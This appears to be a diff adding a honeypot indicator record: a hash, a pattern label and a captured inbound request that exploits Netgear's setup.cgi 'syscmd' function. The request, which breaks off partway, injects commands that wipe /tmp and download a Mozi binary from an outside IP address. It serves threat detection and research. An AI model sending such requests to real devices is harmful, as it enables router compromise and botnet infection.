@@ -1,0 +1,5 @@
+SHA256: 00f40e167f5f090fc96bb81d17490a45f5fe24a8880b95e9bd378864aa625c09
+Pattern: Netgear setup.cgi syscmd downloader
+Evidence source: T-Pot inbound payload
+
+GET /setup.cgi?next_file=netgear.cfg&todo=syscmd&cmd=rm+-rf+/tmp/*;wget+hxxp://160.30.142.XXX:60115/Mozi.m+-O+/tmp/netge
